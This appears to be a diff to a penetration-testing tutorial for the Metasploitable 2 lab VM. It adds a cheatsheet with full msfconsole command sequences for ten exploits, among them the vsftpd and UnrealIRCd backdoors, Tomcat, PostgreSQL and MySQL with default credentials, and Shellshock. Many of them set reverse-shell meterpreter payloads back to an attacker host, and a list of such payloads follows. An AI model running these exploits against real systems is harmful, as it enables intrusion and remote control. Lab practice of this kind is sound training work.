@@ -37,25 +37,25 @@ Metasploit is a powerful framework for developing and executing exploit code aga
 For instance, if Nmap or Nessus identifies a vulnerable FTP service (e.g., vsftpd 2.3.4), you can exploit it using Metasploit:
 
 1. Launch Metasploit:
-
+```bash
 msfconsole
-
+```
 2. Search for the exploit:
-
+```bash
 search vsftpd
-
+```
 3. Select the appropriate exploit:
-
+```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
-
+```
 4. Set the target IP:
-
+```bash
 set RHOST <target_ip>
-
+```
 5. Run the exploit:
-
+```bash
 exploit
-
+```
 If successful, you will gain a shell on the target machine, allowing you to further investigate and exploit other vulnerabilities.
 
 Top 10 Exploits in Metasploitable 2
@@ -73,7 +73,143 @@ The metasploitable2_exploits.txt file in the GitHub repository lists the top 10 
 9. Drupal 6.8 SQL Injection
 10. PHP CGI Argument Injection
 
-Conclusion
+
+
+## Metasploitable2 Exploitation Cheatsheet
+========================================
+
+### Disclaimer:
+-----------
+This guide is for educational & authorized penetration testing only.
+Ensure you have explicit permission to run these tests.
+
+### 1) Scan Open Ports & Services
+-----------------------------
+```bash
+nmap -sS -sV -p- 192.168.130.132
+```
+
+### 2) VSFTPD Backdoor (Port 21)
+----------------------------
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.130.132
+set RPORT 21
+run
+```
+
+### 3) UnrealIRCd Backdoor (Port 6667)
+----------------------------------
+```bash
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.130.132
+set RPORT 6667
+run
+```
+
+### 4) DistCC Command Execution (Port 3632)
+---------------------------------------
+```bash
+use exploit/unix/misc/distcc_exec
+set RHOSTS 192.168.130.132
+set RPORT 3632
+run
+```
+
+### 5) Samba Usermap Script (Port 139 / 445)
+----------------------------------------
+```bash
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.130.132
+set RPORT 139
+run
+```
+
+### 6) Tomcat Manager (Port 8180)
+-----------------------------
+```bash
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.130.132
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set TARGET 0
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST 192.168.130.140
+set LPORT 4444
+run
+```
+
+### 7) PostgreSQL (Port 5432)
+-------------------------
+```bash
+use exploit/multi/postgres/postgres_payload
+set RHOSTS 192.168.130.132
+set RPORT 5432
+set USERNAME postgres
+set PASSWORD postgres
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.130.140
+set LPORT 4444
+run
+```
+
+### 8) MySQL (Port 3306)
+--------------------
+```bash
+use exploit/windows/mysql/mysql_udf_payload
+set RHOSTS 192.168.130.132
+set RPORT 3306
+set USERNAME root
+set PASSWORD root
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.130.140
+set LPORT 4444
+run
+```
+
+### 9) Shellshock (Port 80 / 8080)
+------------------------------
+```bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS 192.168.130.132
+set TARGETURI /cgi-bin/status
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.130.140
+set LPORT 4444
+run
+```
+
+### 10) Joomla (Port 80)
+--------------------
+```bash
+use exploit/multi/http/joomla_http_header_rce
+set RHOSTS 192.168.130.132
+set TARGETURI /joomla/
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.130.140
+set LPORT 4444
+run
+```
+
+### Useful Payloads
+---------------
+```bash
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set PAYLOAD linux/x86/shell/reverse_tcp
+set PAYLOAD java/meterpreter/reverse_tcp
+set PAYLOAD cmd/unix/reverse
+set PAYLOAD php/meterpreter/reverse_tcp
+```
+### Notes:
+------
+- Always run 'search <service>' in msfconsole to find more modules.
+- Check '/usr/share/exploitdb/' for non-Metasploit exploits.
+- For manual exploitation, tools like 'nc', 'curl', and custom scripts can be used.
+
+  
+### Conclusion
+
 
 Metasploitable 2 serves as an excellent platform for learning and practicing penetration testing techniques. By combining tools like Nmap, Nessus, and Metasploit, you can simulate real-world attacks and enhance your cybersecurity skills. Always remember to conduct such activities in a legal and ethical manner, ensuring you have proper authorization before testing any systems.
 
